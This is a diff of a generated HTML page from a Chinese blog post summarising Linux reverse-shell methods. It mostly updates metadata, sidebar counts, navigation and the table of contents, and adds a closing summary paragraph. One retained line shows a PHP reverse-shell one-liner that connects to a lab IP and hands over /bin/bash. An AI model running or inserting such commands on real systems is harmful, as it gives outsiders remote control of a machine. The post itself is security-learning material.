@@ -119,7 +119,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/JbLmF1b3l9.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/1H1Ie6D8Hg.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180718/B0c9GjFmD5.png?imageslim">
-<meta property="og:updated_time" content="2018-07-18T07:21:39.633Z">
+<meta property="og:updated_time" content="2018-07-18T07:31:30.632Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux下几种反弹shell方法的总结与理解">
 <meta name="twitter:description" content="Linux下几种反弹shell方法的总结与理解之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法">
@@ -450,6 +450,7 @@ nc -help成功
 <p><strong>在CentOS上反向连接，输入</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/1H1Ie6D8Hg.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/B0c9GjFmD5.png?imageslim" alt="mark"><br><strong>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</strong></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>写这篇文章加上查阅资料花了一天多的时间，感觉自己现在真正的将这四种方法理解透了，能够自己去写一些反弹shell的命令了，所以付出还是值得的，网上还有不少反弹shell的命令，以后自己会不断的补充，It’s the climb!</strong></p>
 <h3 id="有关反弹shell的一些不错的资料"><a href="#有关反弹shell的一些不错的资料" class="headerlink" title="有关反弹shell的一些不错的资料"></a>有关反弹shell的一些不错的资料</h3><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" title="Linux下反弹shell的种种方式 - r00tgrok - 博客园" target="_blank" rel="external"><strong>Linux下反弹shell的种种方式 - r00tgrok - 博客园</strong></a></p>
 <p><a href="https://www.anquanke.com/post/id/85712" title="Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体" target="_blank" rel="external"><strong>Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体</strong></a></p>
 <p><a href="https://www.cnblogs.com/jnxb/p/3940593.html" title="Linux nc命令用法收集 - 江南小碧 - 博客园" target="_blank" rel="external"><strong>Linux nc命令用法收集 - 江南小碧 - 博客园</strong></a></p>
@@ -494,6 +495,10 @@ nc -help成功
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/08/漏洞组合/" rel="prev" title="Apache安全加固">
+                Apache安全加固 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -574,7 +579,7 @@ nc -help成功
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -585,7 +590,7 @@ nc -help成功
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -596,7 +601,7 @@ nc -help成功
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -657,7 +662,7 @@ nc -help成功
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下几种反弹shell方法的总结与理解"><span class="nav-number">1.</span> <span class="nav-text">Linux下几种反弹shell方法的总结与理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.0.2.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">1.0.3.</span> <span class="nav-text">方法2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法3："><span class="nav-number">1.0.4.</span> <span class="nav-text">方法3：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法4："><span class="nav-number">1.0.5.</span> <span class="nav-text">方法4：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有关反弹shell的一些不错的资料"><span class="nav-number">1.0.6.</span> <span class="nav-text">有关反弹shell的一些不错的资料</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下几种反弹shell方法的总结与理解"><span class="nav-number">1.</span> <span class="nav-text">Linux下几种反弹shell方法的总结与理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.0.2.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">1.0.3.</span> <span class="nav-text">方法2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法3："><span class="nav-number">1.0.4.</span> <span class="nav-text">方法3：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法4："><span class="nav-number">1.0.5.</span> <span class="nav-text">方法4：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.0.6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有关反弹shell的一些不错的资料"><span class="nav-number">1.0.7.</span> <span class="nav-text">有关反弹shell的一些不错的资料</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
